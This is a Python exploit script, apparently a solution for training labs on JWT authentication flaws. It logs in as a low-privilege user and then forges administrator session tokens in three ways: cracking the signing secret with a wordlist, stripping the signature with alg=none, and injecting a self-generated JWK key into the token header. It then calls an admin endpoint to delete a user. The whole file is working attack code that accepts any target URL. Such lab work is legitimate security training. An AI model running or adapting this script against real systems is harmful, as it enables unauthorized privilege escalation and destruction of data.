#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Jul 28 18:56:47 2024

@author: blanco
"""



import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import base64
import json
from urllib.parse import urljoin
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxies (adjust if necessary)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Wordlist for secret key cracking
wordlist_file = '/usr/share/wordlists/rockyou.txt'

# Function to get CSRF token
def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
        print(f"(+) CSRF token found: {csrf}")
        return csrf
    else:
        print("(-) CSRF token not found on the page.")
        sys.exit(-1)

# Function to login and retrieve JWT token from cookies
def login(url, s, username, password):
    login_url = urljoin(url, '/login')
    csrf_token = get_csrf_token(s, login_url)

    # Send login request with CSRF token
    login_params = {'csrf': csrf_token, 'username': username, 'password': password}
    r = s.post(login_url, data=login_params, verify=False, proxies=proxies, allow_redirects=False)

    if r.status_code == 302:
        print("(+) Login is successful.")
        # Attempt to retrieve JWT from session cookies
        jwt_token = r.cookies.get('session')
        if jwt_token:
            print(f"(+) JWT token retrieved: {jwt_token}")
            return jwt_token
        else:
            print("(-) JWT not found in session cookies.")
            sys.exit(-1)
    else:
        print("(-) Login not successful.")
        sys.exit(-1)

# Generate RSA Key Pair
def generate_rsa_key_pair():
    print("(+) Generating RSA key pair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    public_key = private_key.public_key()

    # Export the private key for signing
    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Extract the public key components for the JWK header
    public_numbers = public_key.public_numbers()
    e_b64 = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
    n_b64 = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')

    return private_key_pem, e_b64, n_b64

# Perform the JWT bypass via JWK header injection
def jwt_bypass_jwk_injection(url, token):
    # Step 1: Decode the JWT without verifying it
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    decoded_header = jwt.get_unverified_header(token)
    print(f"(+) Decoded token: {decoded_token}")
    print(f"(+) Decoded header: {decoded_header}\n")

    # Step 2: Modify the token payload to escalate privileges
    decoded_token['sub'] = 'administrator'
    print(f"(+) Modified token: {decoded_token}\n")

    # Step 3: Generate a new RSA key pair
    private_key_pem, e_b64, n_b64 = generate_rsa_key_pair()

    # Step 4: Build the JWK header with the public key
    jwk = {
        "kty": "RSA",
        "e": e_b64,
        "n": n_b64
    }

    # Step 5: Sign the modified JWT using the private key and embed the JWK in the header
    modified_token = jwt.encode(decoded_token, private_key_pem, algorithm='RS256', headers={'jwk': jwk})
    
    print(f"(+) Modified JWT with JWK header: {modified_token}\n")
    
    # Step 6: Use the modified token in an attempt to access the admin panel and delete Carlos
    print("(+) Attempting to access the admin panel with the modified JWT...")
    cookies = {'session': modified_token}
    delete_carlos_url = urljoin(url, '/admin/delete?username=carlos')
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    
    if "User deleted successfully" in r.text:
        print("(+) Successfully deleted the Carlos user!")
    else:
        print("(-) Attack was unsuccessful")



# JWT Bypass via secret cracking and re-signing
def bypass_flawed_signature_verification(url, token):
    def attempt_fuzzing(secret_key, algorithm):
        try:
            decoded = jwt.decode(token, secret_key, algorithms=[algorithm])
            print(f"(+) Valid key found: {secret_key}")
            print(f"(+) Decoded payload: {decoded}")
            return True, secret_key, decoded
        except jwt.InvalidSignatureError:
            return False, None, None
        except Exception as e:
            print(f"(-) Error during fuzzing: {e}")
            # If we encounter an error related to PEM files, skip fuzzing and attempt a simpler bypass
            if "PEM" in str(e):
                print("(-) PEM file error encountered, skipping fuzzing and attempting a simpler bypass...")
                return "skip_fuzzing", None, None
            return False, None, None

    def fuzz_secret_key(wordlist):
        header = jwt.get_unverified_header(token)
        algorithm = header.get("alg")
        if not algorithm:
            print("(-) Algorithm not found in JWT header.")
            return None, None
        else:
            print(f"(+) Algorithm: {algorithm}")

        with open(wordlist, "r") as file:
            for line in file:
                secret_key = line.strip()
                valid, found_key, payload = attempt_fuzzing(secret_key, algorithm)
                if valid == "skip_fuzzing":
                    return "skip_fuzzing", None
                elif valid:
                    return found_key, payload
        return None, None

    # Start fuzzing the secret key
    print("(+) Attempting to crack JWT secret...")
    found_key, payload = fuzz_secret_key(wordlist_file)
    
    # If fuzzing was skipped or no valid secret key was found, try simpler bypass
    if found_key == "skip_fuzzing" or not found_key:
        print("(-) No valid secret key found or fuzzing was skipped. Attempting simpler bypass with alg=none.")
        
        # Split JWT into header, payload, and signature
        header, payload, signature = token.split('.')

        # Decode the payload (base64 -> bytes -> string -> dict)
        decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
        payload_dict = json.loads(decoded_payload.decode())

        # Modify the payload to escalate privileges (e.g., change sub to administrator)
        payload_dict['sub'] = 'administrator'
        print(f"(+) Modified payload: {json.dumps(payload_dict, indent=4)}")

        # Re-encode the modified payload (Base64 URL encoding)
        modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()

        # Modify the header to set "alg" to "none"
        header_dict = json.loads(base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode())
        header_dict['alg'] = 'none'
        modified_header_b64 = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).rstrip(b'=').decode()

        # Create the modified token (header.payload.) - no signature
        modified_token = f"{modified_header_b64}.{modified_payload_b64}."
        print(f"(+) Modified JWT token (alg=none): {modified_token}\n")

        # Use the modified token in an attempt to delete the user Carlos
        print("(+) Attempting to delete the user Carlos with modified token...")
        cookies = {'session': modified_token}
        delete_carlos_url = urljoin(url, '/admin/delete?username=carlos')
        r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
        
        if "User deleted successfully" in r.text:
            print("(+) Successfully deleted the Carlos user!")
        else:
            print("(-) Attack was unsuccessful")
    else:
        print(f"(+) Secret key found: {found_key}")
        
        # Modify the payload to escalate privileges (e.g., change sub to administrator)
        payload['sub'] = 'administrator'
        print(f"(+) Modified payload: {json.dumps(payload, indent=4)}")

        # Re-sign the JWT with the cracked secret key
        header = jwt.get_unverified_header(token)
        new_jwt_token = jwt.encode(payload, found_key, algorithm=header['alg'])

        print(f"(+) Modified and re-signed JWT: {new_jwt_token}")

        # Use the new JWT in an attempt to delete the user Carlos
        print("(+) Attempting to delete the user Carlos with the re-signed JWT...")
        cookies = {'session': new_jwt_token}
        delete_carlos_url = urljoin(url, '/admin/delete?username=carlos')
        r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
        
        if "User deleted successfully" in r.text:
            print("(+) Successfully deleted the Carlos user!")
        else:
            print("(-) Attack was unsuccessful")

# Main function
def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    regular_username = "wiener"
    regular_password = "peter"
    
    # Start a session to persist cookies
    s = requests.Session()

    # Log in as a regular user
    regular_user_jwt = login(url, s, regular_username, regular_password)

    # If login is successful, perform the attack
    if regular_user_jwt:
        # Perform bypass via cracked secret or fallback to alg=none
        bypass_flawed_signature_verification(url, regular_user_jwt)
  
    # If login is successful, perform the attack
    if regular_user_jwt:
        # Perform bypass via cracked secret or fallback to alg=none
        jwt_bypass_jwk_injection(url, regular_user_jwt)

if __name__ == "__main__":
    main()
